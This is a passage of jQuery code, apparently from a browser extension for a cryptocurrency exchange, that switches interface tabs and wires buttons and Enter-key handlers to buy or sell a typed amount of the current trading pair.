    $('#btnHideChart').show();
    $(this).hide()
});
var switchTab = function(id) {
    $('#HoangExt ul.tabs > li').removeClass('active');
    $('#HoangExt ul.tabs > li[data-tab="' + id + '"]').addClass('active');
    $('.tab-display').hide();
    $('.tab-' + id + '-display').show();
    tabIndex = id
};
$(document).on('click', '#btnUrgentBuyLearn', function() {
    var e = jQuery.Event('keyup');
    e.which = 13;
    $('#urgentBuyLearn').trigger(e)
});
$(document).on('click', '#btnUrgentSellLearn', function() {
    var e = jQuery.Event('keyup');
    e.which = 13;
    $('#urgentSellLearn').trigger(e)
});
$(document).on('click', '#btnSellAllLearn', function() {
    displayMessage('Selling...');
    setTimeout(function() {
        var pair = exchangeObject.getMarketName();
        learningObject.sell(pair, learningObject.getAmountOfPair(pair), exchangeObject.getCurrentPrice())
    }, 500)
});
$(document).on('keyup', '#urgentBuyLearn', function(e) {
    var k = e.which || e.keyCode;
    var total = $(this).val();
    if (k === 13) {
        if (total == '') {
            displayMessage('Please type your amount to buy.')
        } else {
            displayMessage('Buying...');
            setTimeout(function() {
                learningObject.buy(exchangeObject.getMarketName(), parseFloat(total), exchangeObject.getCurrentPrice())
            }, 500)
        }
    }
});
$(document).on('keyup', '#urgentSellLearn', function(e) {
    var k = e.which || e.keyCode;
    var amount = $(this).val();
    if (k === 13) {
        if (amount == '') {
            displayMessage('Please type your amount to sell.')
        } else {
            displayMessage('Selling...');
            setTimeout(function() {
                learningObject.sell(exchangeObject.getMarketName(), parseFloat(amount), exchangeObject.getCurrentPrice())
            }, 500)
        }
    }
});
switchTab(1);